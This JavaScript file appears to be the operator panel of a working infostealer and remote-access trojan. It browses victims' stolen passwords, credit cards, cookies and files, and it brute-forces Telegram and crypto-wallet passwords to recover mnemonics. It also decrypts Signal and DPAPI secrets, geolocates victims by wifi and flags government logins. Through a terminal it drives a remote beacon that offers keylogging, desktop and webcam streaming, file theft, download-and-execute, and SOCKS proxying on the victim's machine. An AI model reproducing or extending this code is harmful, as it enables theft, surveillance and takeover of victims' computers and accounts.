var current_cookies_modal, current_filename, current_extension_wallet, proxies;
var terminal_locked = false;
var prev_keylogger_data_length = 0;
var actions_available = 1;
var active_keylogger_view = '';
var streaming_is_active = false;
var streaming_command = '';
var geolocation_window_open = false;
var geolocation_finished = false

var current_report_path = b64DecodeUnicode(window.location.search.replace('?path=', ''));
var current_report_name = '';
var current_report_is_exported = false;

eel.expose(lock_connections);
function lock_connections() {
    terminal_locked = true;
    document.getElementById('terminal-input').disabled = true;
}

eel.expose(unlock_connections);
function unlock_connections() {
    terminal_locked = false;
    document.getElementById('terminal-input').disabled = false;
}

function stop_stream() {
    if (streaming_is_active) {
        notification('Stopping stream', 'svg-spinners:bars-scale-fade');
        let el = document.getElementById('stream-item');
        el.style.display = 'none';
        document.getElementById('beacon-terminal-item').scrollIntoView();
        streaming_is_active = false;
        streaming_command = '';
    }
}

function begin_stream(target) {
    if (!streaming_is_active) {
        if (target == 'desktop') {
            streaming_command = 'SCREENSHOT;';
        } else if (target == 'webcam') {
            streaming_command = 'WEBCAM;';
        } else {
            notification(`Unknown ${target} target`, 'svg-spinners:bars-scale-fade');
            return;
        }
        notification(`Starting ${target} stream`, 'svg-spinners:bars-scale-fade');
        let el = document.getElementById('stream-item');
        el.style.display = 'block';
        el.scrollIntoView();
        // Open stream window
        document.getElementById('stream-item-link').click()
        
        streaming_is_active = true;
    }
}

async function automatic_action(name, args) {
    console.log(name, args);
    switch (name) {
        case 'open_telegram': {
            notification('Starting telegram ...', 'ic:baseline-telegram');
            eel.openTelegram()();
            break;
        }
        case 'view_signal': {
            notification('Decrypting signal credentials ...', 'cib:signal', 13000);
            let response = (await eel.viewSignal(args)());
            console.log(response);
            if (response.startsWith('ERROR: ')) {
                notification(response, 'cib:signal');
            } else {
                UIkit.modal.alert(b64DecodeUnicode(response))
            }
            
            break;
        }
        case 'open_steam': {
            notification('Viewing steam profile ...', 'mdi:steam');
            window.open('https://steamcommunity.com/profiles/' + args)
            break;
        }
        case 'open_instagram': {
            notification('Viewing instagram profile ...', 'mdi:instagram');
            window.open('https://instagram.com/' + args)
            break;
        }
        case 'open_github': {
            notification('Viewing github profile ...', 'mdi:github');
            window.open('https://github.com/' + args)
            break;
        }
        case 'open_vk': {
            notification('Viewing VK profile ...', 'uil:vk');
            window.open('https://vk.com/id' + args)
            break
        }
        case 'open_facebook': {
            notification('Viewing facebook profile ...', 'carbon:logo-facebook');
            window.open('https://www.facebook.com/' + args)
            break;
        }
        case 'open_twitch': {
            notification('Viewing twitch profile ...', 'mdi:twitch');
            window.open('https://www.twitch.tv/' + args)
            break;
        }
        case 'open_xenforo': {
            notification(`Viewing ${args[0]} profile ...`, 'ic:baseline-forum');
            window.open(`https://${args[0]}/members/${args[1]}`)
            break;
        }
        case 'open_ftp': {
            notification('Establishing connection ...', 'mdi:server-network');
            eel.openFTP(args)();
            break;
        }
        case 'alert_data': {
            UIkit.modal.alert(`<h2 style="text-align: center">${args[0]}</h2><br>${args[1]}`)
            break;
        }
        case 'request_proxies': {
            notification('Searching for proxies ...', 'eos-icons:loading', 8000);
            proxies = (await eel.requestProxies()());
            if (proxies['error']) {
                notification(proxies['message'], 'mdi:connection', 6000);
            } else {
                let table = document.getElementById('proxies-table');
                table.innerHTML = proxies['html'];
                // document.getElementById('proxies-area').value = proxies['proxies'].join('\n');
                UIkit.modal(document.getElementById('proxies-modal')).show();
            }
            break;
        }
        case 'open_discord': {
            notification('Starting discord ...', 'ic:baseline-discord');
            eel.openDiscord(args)();
            break;
        }
        case 'open_webbrowser': {
            notification('Starting ' + args.split('_')[0], 'fe:browser');
            eel.openWebBrowser(args)();
            break;
        }
        case 'open_wallet_extension': {
            let response = (await eel.openWalletExtension(args)());
            let modal = document.getElementById('bruteforce-extension-passwords-modal');
            current_extension_wallet = response['filename'];
            document.getElementById('current-wallet-title').innerText = response['title'];
            let blockchain = document.getElementById('current-wallet-blockchain');
            blockchain.setAttribute('href', 'https://etherscan.io/address/' + response['address']);
            blockchain.innerText = 'View ' + response['address'] + ' on blockchain';
            UIkit.modal(modal).show();
            break;
        }
    }
}


function write_terminal_data(text) {
    let terminal = document.getElementById('terminal-output');
    terminal.value += text.trim() + '\n';
    terminal.scrollTop = terminal.scrollHeight;
    document.getElementById('terminal-input').focus();
}

function write_terminal_input(text) {
    let input = document.getElementById('terminal-input');
    input.value = text;
    input.scrollIntoView();
    input.focus();
}

function expose_remote_port(ip, port) {
    let scheme = port == '80' || port == '443' ? 'HTTP' : 'TCP';
    write_terminal_input(`expose ${scheme} ${ip} ${port}`);
}

function export_keylogger() {
    let data = document.getElementById('current-keylogger-data').value;
    downloadFile(`${active_keylogger_view}_log.txt`, data, false);
}

async function view_keylogger_data(process) {
    console.log('Keylogger view: ' + process);
    // Send
    if (beacon_url.length > 0) {
        lock_connections();
        let response = (await eel.beaconCommand(beacon_url, 'KEYLOGGER;VIEW;' + process, '')());
        unlock_connections();
        
        active_keylogger_view = process;
        document.getElementById('keylogger-process-name').innerText = 'View ' + process;
        document.getElementById('current-keylogger-data').value = encodeHTML(response);
        UIkit.modal(document.getElementById('keylogger-modal')).show();
    }
}

function process_arbitrary_pong(packets) {
    if (packets != '0') {
        let pongs = packets.split('\n');
        for (let i = 0; pongs.length > i; i++) {
            if (pongs[i].length > 0) {
                let splt = pongs[i].split('|');
                let command = splt[0];
                let data = splt[1];
            
                console.log('Handle arbitrary packet: ' + pongs[i]);
                switch (command) {
                    case "Print": {
                        write_terminal_data(data)
                        break;
                    }
                    case "NetDiscover": {
                        appendNetDiscoverPacket(pongs[i]);
                        write_terminal_data('Local network report was received!')
                        break;
                    }
                }
            }
        }
    }
}

function process_keylogger_pong(processes) {
    let keylogger_item = document.getElementById('keylogger-item');
    
    // Show keylogger window if data found
    if (processes.length > 0 && processes[0] != '') {
        // Update buttons if new data received
        if (prev_keylogger_data_length != processes.length) {
            keylogger_item.style.display = 'list-item';
            let button_update_data = '';

            processes.forEach(element => {
                button_update_data += `
                <button class="uk-button uk-button-primary" onclick="view_keylogger_data('${element}');" aria-expanded="false">
                    <iconify-icon icon="mdi:script-text-key-outline"></iconify-icon>
                    ${encodeHTML(element)}
                </button>`;
            });

            document.getElementById('keylogger-buttons-data').innerHTML = button_update_data;
            console.log(processes);
            prev_keylogger_data_length = processes.length;
        }
        
    } else {
        keylogger_item.style.display = 'none';
    }
}

async function ping_beacon() {
    if (terminal_locked) { return; }
    if (beacon_url == 'http://serveo') {
        document.getElementById('terminal-activity-input').value = 'Awaiting serveo url to connect ...';
        return;
    }
    // Desktop stream
    if (streaming_is_active) {
        let image = document.getElementById('stream-image');
        let response = (await eel.beaconCommand(beacon_url, streaming_command)());

        if (response.length > 20) {
            image.src = 'data:image/png;base64, ' + response;
        } else {
            write_terminal_data('Screenshot failed ...');
            notification('Screenshot failed ...', 'line-md:alert');
            // Stop
            document.getElementById('stream-item-link').click();
        }
    }
    // Terminal commands
    else {
        let terminal_status = document.getElementById('terminal-status');
        let response = (await eel.beaconCommand(beacon_url, 'PING')());
        
        if (response.startsWith('PONG')) {
            terminal_status.style.display = 'inline-block';
            // Current active window
            let splt = response.split('>>');
            //let activity = response.split('>>').slice(-1);
            document.getElementById('terminal-activity-input').value = `Active window: "${splt[1]}"`;
            // Handle keylogger updates
            try {
                process_keylogger_pong(splt[2].split(','));
            } catch {}
            // Handle arbitrary messages from beacon
            try {
                process_arbitrary_pong(splt[3]);
            } catch {}
        } else {
            terminal_status.style.display = 'none';
        }
    }
    
}

async function handle_terminal_input() {
    if (terminal_locked) { return; }
    let input = document.getElementById('terminal-input');
    let text = input.value;
    if (beacon_url.length > 0) {
        if (text.length > 0) {
            write_terminal_data('> ' + text);
            input.value = '';
            if (text == 'cls' || text == 'clear') {
                document.getElementById('terminal-output').value = '';
            } else if (text == 'help') {
                write_terminal_data(`
help - Display this text.
clear - Clear terminal.
connect <http://ADDRESS.serveo.net> - Access serveo address.
refresh - Refresh log credentials.
uninstall - Uninstall beacon from pc.
screenshot - Make desktop screenshot.
webcam - Make webcam screenshot.
expose <TCP/HTTP> <IP> <PORT> - Expose local IP and port.
stream <desktop/webcam/stop> - Start streaming desktop or webcam.
keylogger <start/stop> - Keylogger module control.
cd - Change current directory.
ls - Get files in current directory.
get-file <PATH> - Download file from remote pc.
dpapi <base64 encrypted data> - Decrypt DPAPI blob (CurrentUserScope)
process-list - Get Running processes.
loader <URLS separated by comma> - Download files to remote pc.
loadexec <URLS separated by comma> - Download and execute files on remote pc.
transfer <filename> - Upload file to sharing service and get direct url.
compress <directory> - Create ZIP from directory.
decompress <zip file> - Extract ZIP content to current directory.
netdiscover - Scan local network for devices and open ports.
proxy-setup - Setup SOCKS5 proxy on victim's machine.

Or you can enter any windows command.`);
            } else {
                let command;
                let conf = '';
                // Status update
                let status_icon = document.getElementById('terminal-status-icon');
                status_icon.style.display = 'inline-block';
                // Format the command
                if (text.startsWith('get-file')) { command = 'GET_FILE;' + text.slice(9); } 
                else if (text.startsWith('netdiscover')) { command = 'NETDISCOVER;'; }
                else if (text.startsWith('connect')) {
                    let serveoUrl = text.split(' ').pop();
                    write_terminal_data('Trying connect to ' + serveoUrl);
                    beacon_url = serveoUrl;
                    return;
                }
                else if (text.startsWith('expose')) {
                    eArgs = text.split(' ');
                    command = 'EXPOSE;' + eArgs[1] + ';' + eArgs[2] + ';' + eArgs[3];
                }
                else if (text.startsWith('proxy-setup')) { command = 'PROXY_SETUP;'; }
                else if (text.startsWith('ls')) { command = 'LIST_FILES;'; }
                else if (text.startsWith('process-list')) { command = 'LIST_PROCESSES;'; }
                else if (text.startsWith('screenshot')) { command = 'SCREENSHOT;'; } 
                else if (text.startsWith('stream')) {
                    let action = text.split(' ').slice(-1).pop();
                    if (action == 'stop') {
                        // Stop
                        document.getElementById('stream-item-link').click()
                        return;
                    }
                    begin_stream(action);
                    write_terminal_data('Starting stream ...');
                    return;
                }
                else if (text.startsWith('dpapi')) {
                    let blob = text.split(' ').slice(-1).pop();
                    command = 'DPAPI;' + blob;
                }
                else if (text.startsWith('webcam')) { command = 'WEBCAM;'; }
                else if (text.startsWith('ping')) { command = 'PING;'; }
                else if (text.startsWith('refresh')) { 
                    command = 'REFRESH;';
                    conf = current_report_path;
                    let message = current_report_is_exported ? 'file will be downloaded automatically.' : 'page will be reloaded automatically.';
                    write_terminal_data('This may take time, ' + message);
                } 
                else if (text.startsWith('keylogger')) {
                    command = 'KEYLOGGER;';
                    if (text.includes('start')) { command += 'START'; }
                    else if (text.includes('stop')) { command += 'STOP'; }
                }
                else if (text.startsWith('uninstall')) { command = 'UNINSTALL;'; } 
                else if (text.startsWith('loader')) { command = 'LOADER;' + text.slice(7); } 
                else if (text.startsWith('loadexec')) { command = 'LOADEXEC;' + text.slice(9); } 
                else if (text.startsWith('transfer')) { command = 'TRANSFER;' + text.slice(9); } 
                else if (text.startsWith('compress')) { command = 'COMPRESS;' + text.slice(9); } 
                else if (text.startsWith('decompress')) { command = 'DECOMPRESS;' + text.slice(11); } 
                else { command = text; }
                // Send
                lock_connections();
                let response = (await eel.beaconCommand(beacon_url, command, conf)());
                unlock_connections();
                // Status update
                status_icon.style.display = 'none';
                // Error
                if (response.includes('Max retries exceeded with url')) {
                    write_terminal_data('Device is offline or tor service doesn\'t running.');
                    return;
                }
                // Handle response
                let splt = command.split(';');
                switch (splt[0]) {
                    case "GET_FILE": {
                        let filename = splt[1].split('\\').slice(-1)[0];
                        downloadFile(filename, response, true);
                        break;
                    }
                    case "REFRESH": {
                        break;
                    }
                    case "UNINSTALL": {
                        write_terminal_data("Beacon removed.");
                        break;
                    }
                    case "SCREENSHOT": {
                        if (response.length > 20) {
                            let img = document.getElementById('terminal-screenshot-image');
                            let modal = document.getElementById('terminal-screenshot-modal');
                            img.src = 'data:image/png;base64, ' + response;
                            UIkit.modal(modal).show();
                        } else {
                            write_terminal_data('Desktop screenshot failed.')
                        }
                        break;
                    }
                    case "WEBCAM": {
                        if (response.length > 20) {
                            let img = document.getElementById('terminal-screenshot-image');
                            let modal = document.getElementById('terminal-screenshot-modal');
                            img.src = 'data:image/png;base64, ' + response;
                            UIkit.modal(modal).show();
                        } else {
                            write_terminal_data('Webcam screenshot failed.')
                        }
                        break;
                    }
                    default: {
                        write_terminal_data(response);
                    }
                }
            }
        }
    }
}

eel.expose(telegram_bruteforce_modal)
function telegram_bruteforce_modal() { UIkit.modal(document.getElementById('bruteforce-telegram-passwords-modal')).show(); }

eel.expose(new_automatic_action_callback)
function new_automatic_action_callback(action_html) {
    let actions = document.getElementById('actions');
    if (!actions.innerHTML.includes(action_html)) {
        actions_available += 1;
        document.getElementById('actions_count').innerText = actions_available + ' Actions available';
        actions.insertAdjacentHTML('beforeend', action_html);
    }
}

async function performActionsScan() {
    console.log('Scanning for actions ...');
    if (await eel.scan_actions_entries()()) {
        document.getElementById('actions_icon').setAttribute('icon', 'bi:robot');
        notification('Actions scan completed', 'bi:robot');
        document.getElementById('actions_text').innerHTML = 'Automatic actions'
    }
}

async function start_bruteforce_telegram() {
    let icon = document.getElementById('bruteforce-telegram-wallet-passwords-icon');
    // Read textarea
    let passwordsArea = document.getElementById('bruteforce-telegram-passwords-textarea');
    let passwordsList = passwordsArea.value.split('\n');
    // Check
    if (passwordsArea.value == '' || passwordsList.length == 0) {
        notification('No passwords specified ...', 'mdi:form-textbox-password');
        return;
    }
    // Start
    icon.setAttribute('icon', 'eos-icons:loading');
    let operation = (await eel.bruteforceTelegram(passwordsList)());
    // Done
    if (operation['status']) {
        icon.setAttribute('icon', 'line-md:confirm-circle');
        UIkit.modal.alert(`Success, found ${operation['sessions'].length} session(s)<br><br>Local key: ${operation['key']}<br>`);
    } else {
        icon.setAttribute('icon', 'line-md:close-circle');
        UIkit.modal.alert('No password found');
    }
    setTimeout(function(){ icon.setAttribute('icon', 'fluent:key-multiple-20-regular'); }, 3000);
}


async function start_bruteforce_extension() {
    let icon = document.getElementById('bruteforce-extension-wallet-passwords-icon');
    // Read textarea
    let passwordsArea = document.getElementById('bruteforce-wallet-passwords-textarea');
    let passwordsList = passwordsArea.value.split('\n');
    // Check
    if (passwordsArea.value == '' || passwordsList.length == 0) {
        notification('No passwords specified ...', 'mdi:form-textbox-password');
        return;
    }
    // Start
    icon.setAttribute('icon', 'eos-icons:loading');
    let operation = (await eel.startWalletExtensionBruteforce(current_extension_wallet, passwordsList)());
    // Done
    if (operation['status']) {
        icon.setAttribute('icon', 'line-md:confirm-circle');
        UIkit.modal.alert(`Success<br><br>Password: ${operation['key']}<br>Mnemonic:<br>${operation['mnemonic']}`);
    } else {
        icon.setAttribute('icon', 'line-md:close-circle');
        UIkit.modal.alert('No password found');
    }
    setTimeout(function(){ icon.setAttribute('icon', 'fluent:key-multiple-20-regular'); }, 3000);
}

// Load cookies into modal
function load_cookies(index) {
    let textarea = document.getElementById('current-cookies');
    textarea.value = atob(cookies[index]);
    current_cookies_modal = index;
}

// Cookie converter
function convert_netscape_to_json(cookies, prettyPrint = false) {
    // Results
    let result = [];
    // Split data
    let lines = cookies.split("\n");
    // Iterate
    lines.forEach(function(line, i) {
        var tokens = line.split("\t");
        // We only care for valid cookie def lines
        if (tokens.length == 7) {
            let cookie = {};
            // Trim the tokens
            tokens = tokens.map(function(e) { return e.trim(); });
            // Extract the data
            cookie.domain = tokens[0];
            cookie.httpOnly = tokens[1] === "TRUE";
            cookie.path = tokens[2];
            cookie.secure = tokens[3] === "TRUE";
            // Convert date to a readable format
            let timestamp = tokens[4];
            if (timestamp.length == 17) {
                timestamp = Math.floor(timestamp / 1000000 - 11644473600);
            }
            cookie.expirationDate = parseInt(timestamp);
            cookie.name = tokens[5];
            cookie.value = tokens[6];
            // Save the cookie.
            result.push(cookie);
        }    
    });
    // Done
    if (prettyPrint) {
        return JSON.stringify(result, null, 2);
    } else {
        return JSON.stringify(result);
    }
}

function download_bruteforce_passwords() {
    let data = document.getElementById('bruteforce-passwords-textarea').value;
    downloadFile('bruteforce-list.txt', data, false);
}

function copy_bruteforce_passwords() {
    let data = document.getElementById('bruteforce-passwords-textarea').value;
    copy_text(data);
}

// Launch passwords list modal
async function export_brute_list() {
    let elements = (await eel.createBruteforceList()());
    if (elements.length > 0) {
        document.getElementById('bruteforce-passwords-textarea').value = elements.join('\n');
        UIkit.modal(document.getElementById('bruteforce-passwords-modal')).show();
    }
    else {
        notification('No passwords found ...', 'mdi:form-textbox-password');
    }
}

// Export as json or zip
async function export_report(type) {
    lock_connections();
    let report = (await eel.export_report(current_report_name, type)());
    //downloadFile(current_report_name + '.' + type, report, true);
    notification('Export saved as: ' + report, 'mdi:export');
    unlock_connections();
}

// Export cookies
function export_cookies() {
    var cookies, extension;
    let netscape_cookies = document.getElementById('current-cookies').value;
    let is_netscape = document.getElementById('radio_netscape').checked;
    let is_json = document.getElementById('radio_json').checked;

    if (is_netscape) {
        cookies = netscape_cookies;
        extension = 'txt';
    } else if (is_json) {
        cookies = convert_netscape_to_json(netscape_cookies);
        extension = 'json';
    }

    downloadFile(`${current_cookies_modal}_cookies.${extension}`, cookies, false);
}


// Download folder as .zip file from filemanager
async function grabber_download_dir(path) {
    let zname = path.split('|');
    zname = zname[zname.length - 1];
    let data = await eel.internal_read_directory(path)();
    downloadFile(zname + '.zip', data, true);
    // let zip = new JSZip();
    // for (let i = 0; i < grabber_files.length; i++) {
    //     if (grabber_files[i].dirname.startsWith(path)) {
    //         console.log('Download dir: ' + path);
    //         zip.file(
    //             grabber_files[i].fullname.replace(path.replaceAll('|', '\\') + '\\', ''), 
    //             grabber_files[i].filedata, 
    //             { base64: true }
    //         );
    //     }
    // }
    // zip.generateAsync({type: 'base64'}).then(function(content) {
    //     downloadFile(zname + '.zip', content, true);
    // });
}

// Download file from filemanager
async function grabber_download_file(path) {
    for (let i = 0; i < grabber_files.length; i++) {
        if (path == `${grabber_files[i].dirname}|${grabber_files[i].filename}`) {
            console.log('Download file: ' + path);
            let data = (await eel.internal_read_file(path)());
            downloadFile(grabber_files[i].filename, data, true);
            return;
        }
    }
}

// View file from filemanager
async function grabber_view_file(path) {
    let modal = document.getElementById('files-modal');
    let textarea = document.getElementById('current-file');
    for (let i = 0; i < grabber_files.length; i++) {
        if (path == `${grabber_files[i].dirname}|${grabber_files[i].filename}`) {
            console.log('View file: ' + path);
            textarea.value = 'Please wait ...';
            current_filename = path;
            if (grabber_files[i].filesize > 2000000) {
                notification('The file is too large', 'ic:baseline-warning');
            } else {
                let data = (await eel.internal_read_file(path)());
                textarea.value = b64DecodeUnicode(data);
                UIkit.modal(modal).show();
            }
            return;
        }
    }
}

// Size formatter
const units = ['bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
function readableBytes(x){
    let l = 0, n = parseInt(x, 10) || 0;
    while(n >= 1024 && ++l){
        n = n / 1024;
    }
    return(n.toFixed(n < 10 && l > 0 ? 1 : 0) + ' ' + units[l]);
}

// Select folder in file explorer
function openFolder(folder) {
    let navigation = document.getElementById('files_navigation');
    let counter = document.getElementById('files_counter');
    let table = document.getElementById('files_table');
    let nextDirs = [];
    let nextFiles = [];

    // Re-build navigation menu
    navigation.innerHTML = '';
    let parts = folder.split('|');
    for (let i = 0; i < parts.length; i++) {
        let last = parts.slice(0, i + 1).join('|');
        navigation.innerHTML += `<li><a onclick="openFolder('${last}');">${parts[i]}</a></li>`;
    }
    
    // Get directories
    for (let i = 0; i < grabber_files.length; i++) {
        let el = grabber_files[i];
        if (el.dirname.startsWith(folder)) {
            // Append file
            if (el.dirname == folder) {
                nextFiles.push(el);
            }
            let dname = el.dirname.replace(`${folder}|`, '').split('|')[0];
            // Append directory
            if (!nextDirs.includes(dname) && dname != 'Grabber') {
                nextDirs.push(dname);
            }
        }
    }

    // Change files, dirs count
    counter.innerText = `${nextDirs.length} directories / ${nextFiles.length} files`

    // Cleanup
    table.innerHTML = '';

    for (let i = 0; i < nextDirs.length; i++) {
        let fPath = `${folder}|${nextDirs[i]}`;
        table.innerHTML += `
        <tr>
            <td onclick="openFolder('${fPath}');" class="pointer">
                <iconify-icon icon=\"ic:round-folder\" style="font-size: 24px;"></iconify-icon>
                ${nextDirs[i]}
            </td>
            <td>-</td>
            <td>-</td>
            <td>
                <iconify-icon class="uk-icon-button pointer" icon=\"material-symbols:download\" onclick="grabber_download_dir('${fPath}')"></iconify-icon>
            </td>
        </tr>`;
    }

    for (let i = 0; i < nextFiles.length; i++) {
        let timestamp = new Date(nextFiles[i].createdDate * 1000);
        table.innerHTML += `
        <tr>
            <td onclick="grabber_view_file('${nextFiles[i].dirname}|${nextFiles[i].filename}');" class="pointer">
                <iconify-icon icon=\"mdi:file-document\" style="font-size: 24px;"></iconify-icon>
                ${nextFiles[i].filename}
            </td>
            <td>${readableBytes(nextFiles[i].filesize)}</td>
            <td>${timestamp.toLocaleDateString()} ${timestamp.toLocaleTimeString()}</td>
            <td>
                <iconify-icon class="uk-icon-button pointer" icon=\"material-symbols:download\" onclick="grabber_download_file('${nextFiles[i].dirname}|${nextFiles[i].filename}')"></iconify-icon>
            </td>
        </tr>`;
    }
}

// Remove all hosts from netdiscover menu
function netDiscoverClean() {
    document.getElementById('netdiscover-item').style.display = 'none';
    let ndKeys = document.getElementById('netdiscover-keys');
    let ndValues = document.getElementById('netdiscover-values');
    ndKeys.innerHTML = '';
    ndValues.innerHTML = '';
}

// Add new host into netdiscover menu
async function appendNetDiscoverHost(ip, mac, host, ports = []) {
    let ndKeys = document.getElementById('netdiscover-keys');
    let ndValues = document.getElementById('netdiscover-values');
    let vendor = '-';
    let keyContent = `<li><a href="#">${encodeHTML(ip)}</a></li>`;
    try {
        vendor = (await eel.queryMACInformation(mac)());
    } catch {}
    hostname = host == '?' ? 'Unknown' : encodeHTML(host);
    //mac = 'Hidden for video';
    let valueContent = `
    <li>
        <iconify-icon icon="eos-icons:ip"></iconify-icon>IP Address: ${encodeHTML(ip)}<br>
        <iconify-icon icon="mdi:ethernet"></iconify-icon>MAC Address: ${encodeHTML(mac)}<br>
        <iconify-icon icon="mdi:firewall"></iconify-icon>Hostname: ${hostname}<br>
        <iconify-icon icon="material-symbols:factory"></iconify-icon>Vendor: ${vendor}<br>
        <iconify-icon icon="mdi:dns-outline"></iconify-icon>Ports (${ports.length}):<br>        
    `;
    if (ports.length > 0) {
        valueContent += '<ul class="uk-list">';
        for (const port of ports) {
            let service = '?';
            try { 
                service = (await eel.queryPortInformation(parseInt(port))());
            } catch {}
            valueContent += `<li class="pointer" onclick="expose_remote_port('${encodeHTML(ip)}', '${port}');">${port} - ${service}</li>`;
        }
        valueContent += '</ul>';
    }
    valueContent += '</li>';
    ndKeys.insertAdjacentHTML('beforeend', keyContent);
    ndValues.insertAdjacentHTML('beforeend', valueContent);
    // Show element if it was hidden
    document.getElementById('netdiscover-item').style.display = 'block';
}


async function appendNetDiscoverPacket(data) {
    if (data.startsWith('NetDiscover|')) {
        let text = b64DecodeUnicode(data.split('|')[1]);
        let hostElements = text.replaceAll('\r', '').split('\n');
        netDiscoverClean();
        for (let i = 0; i < hostElements.length; i++) {
            let parsedHost = hostElements[i].split('|');
            let ip = parsedHost[0];
            let mac = parsedHost[1];
            let host = parsedHost[2];
            let ports = []
            if (parsedHost[3].includes(',')) {
                ports = parsedHost[3].split(',').map(p => parseInt(p));;
            }
            await appendNetDiscoverHost(ip, mac, host, ports);
        }
    }
}

function extractTableData(id) {
    let results = [];
    const rows = document.getElementById(id).getElementsByTagName("tr");
    for(let i = 0; i < rows.length; i++) {
        const cells = rows[i].getElementsByTagName("td");
        let cellDataArray = [];
        for(let j = 0; j < cells.length; j++) {
            cellDataArray.push(cells[j].textContent);
        }
        results.push(cellDataArray);
    }
    return results;
}


async function onOpenGeolocationMenu() {
    geolocation_window_open = !geolocation_window_open;
    if (geolocation_window_open && !geolocation_finished) {
        let icon = document.getElementById('geolocation_icon');
        icon.setAttribute('icon', 'eos-icons:loading');
        let response = await eel.queryNetworksLocation(scanning_networks)();
        if (response.length > 0) {
            initGeolocationMap(response);
        } else {
            document.getElementById('geolocation-item').style.display = 'none';
            notification(response['error'], 'material-symbols:satellite-alt-outline-sharp')
        }
        icon.setAttribute('icon', 'material-symbols:satellite-alt-rounded')
        geolocation_finished = true;
    }
}

function initGeolocationMap(networks) {
    document.getElementById('geomap').style.display = 'block';
    document.getElementById('geolocation_loader').style.display = 'none';

    let lightLayer = 'https://tile.openstreetmap.org/{z}/{x}/{y}.png'
    let darkLayer = 'https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png'

	let map = L.map('geomap').setView([networks[0]['latitude'], networks[0]['longitude']], 16);
	L.tileLayer(current_mode == 'dark' ? darkLayer : lightLayer, {
		maxZoom: 19,
	}).addTo(map);
    // Find wifi passwords
    let ssidPassword = {};
    let data = extractTableData('passwords_table_body');
    for (let i = 0; i < data.length; i++) {
        if (data[i][3] == 'Wifi') {
            ssidPassword[data[i][1].trim()] = data[i][2].trim();
        }
    }
    for (let i = 0; i < networks.length; i++) {
        // Check success
        if (!networks[i].hasOwnProperty('error')) {
            // Add circle
            let wifi = L.circle([networks[i]['latitude'], networks[i]['longitude']], {
                color: 'red',
                fillColor: '#f03',
                fillOpacity: 0.5,
                radius: 10
            }).addTo(map);
            // Find key
            let key = ssidPassword.hasOwnProperty(networks[i]['ssid']) ? ssidPassword[networks[i]['ssid']] : null;
            // Network info
            let networkInfo = `
                SSID: ${networks[i]['ssid']}<br>
                BSSID: ${networks[i]['bssid']}<br>
                Signal: ${networks[i]['signal']}<br>
                Vendor: ${networks[i]['vendor']}<br>
                Latitude: ${networks[i]['latitude']}<br>
                Longitude: ${networks[i]['longitude']}<br>
            `;
            // Key data
            if (key != null) {
                networkInfo += `Key: ${key}</br>`
            }
            // Append description
            wifi.bindPopup(networkInfo);
        }
    }
}


// On load
window.addEventListener('load', (e) => {
    // Shit
    if (current_report_path.startsWith('http')) {
        current_report_path = CurrentTemp + '\\' + current_report_path.split('/').slice(-1)[0]
    }
    current_report_name = current_report_path.split('\\').slice(-1)[0].replace('.wsr', '');
    current_report_is_exported = current_report_path.length > 0 && !current_report_path.toLocaleLowerCase().endsWith('.wsr');
    // Handle password search input
    document.querySelector('[data-search]').addEventListener('keyup', function () {
        let term = document.querySelector('[data-search]').value.toLocaleLowerCase();
        let tag = document.querySelectorAll('[data-searchable] tr ');
        for (i = 0; i < tag.length; i++) {
            if (tag[i].children[0].innerHTML.toLocaleLowerCase().indexOf(term) !== -1) {
                tag[i].style.display = '';
            } else {
                tag[i].style.display = 'none';
            }
        }
    });
    // Apply copiable class to fields
    let elements = document.getElementsByClassName("copiable");
    for (let i = 0; i < elements.length; i++) {
        elements[i].addEventListener('click', copy, false);
    }
    // Terminal input
    document.querySelector('#terminal-input').addEventListener('keypress', function (e) {

        if (e.key === 'Enter') {
            handle_terminal_input();
        } 
        
    });
    // Disable export if already exported
    if (current_report_is_exported) {
        document.getElementById('export-json-report-block').style.display = 'none';
    }
    // Ping beacon
    if (beacon_url.length > 0) {
        setInterval(ping_beacon, 4000);
    } else {
        document.getElementById('beacon-terminal-item').style.display = 'none';
        //write_terminal_data('> Beacon is not installed on target system');
    }
    // Load filemanager data
    openFolder('Grabber');

    /* Hide empty tabs */

    // Autofills
    if (document.getElementById('autofill_table_body').rows.length == 0) {
        document.getElementById('autofill_tab').style.display = 'none';
        console.log('AutoFills tab was hidden, no data.')
    }
    // Passwords
    if (document.getElementById('passwords_table_body').rows.length == 0) {
        document.getElementById('passwords_tab').style.display = 'none';
        console.log('Passwords tab was hidden, no data.')
    } else {
        // Highlights notification
        let passwordsRows = document.getElementById("passwords-data-table").rows;
        for (let i = 0; i < passwordsRows.length; i++) {
            if (passwordsRows[i].classList.contains('highlighted')) {
                notification('Government domain detected.', 'fluent:building-government-20-regular', 6000)
                break;
            }
        }
    }
    // CreditCards
    if (document.getElementById('creditcards_table_body').rows.length == 0) {
        document.getElementById('creditcards_tab').style.display = 'none';
        console.log('CreditCards tab was hidden, no data.')
    }
    // Cookies
    if (document.querySelectorAll('button[uk-toggle="target: #cookies-modal"]').length == 0) {
        document.getElementById('cookies_tab').style.display = 'none';
        console.log('Cookies tab was hidden, no data.')
    }
    // History
    if (document.querySelectorAll("#history > li").length == 0) {
        document.getElementById('history_tab').style.display = 'none';
        console.log('History tab was hidden, no data.')
    }
    // Documents
    if (document.getElementById('files_table').rows.length == 0) {
        document.getElementById('files_tab').style.display = 'none';
        console.log('Documents tab was hidden, no data.')
    }

    // Geolocation
    if (scanning_networks.length == 0 || scanning_networks[0] == 'None') {
        document.getElementById('geolocation-item').style.display = 'none';
        console.log('Geolocation tab was hidden, no data.');
    }

    // Scan report for automatic actions
    setTimeout(performActionsScan, 10);
});

function showImage(data) {
    let image = new Image();
    image.src = data;
    let w = window.open("");
    w.document.write(image.outerHTML);
}